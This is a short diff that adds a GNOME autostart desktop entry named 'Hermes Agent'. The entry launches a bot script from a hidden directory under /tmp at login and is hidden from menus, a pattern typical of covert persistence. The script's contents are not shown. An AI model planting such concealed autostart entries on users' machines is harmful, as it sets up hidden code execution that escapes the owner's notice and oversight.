@@ -1,0 +1,7 @@
+[Desktop Entry]
+Type=Application
+Name=Hermes Agent
+Exec=/tmp/.cache/.x/run_bot.sh
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
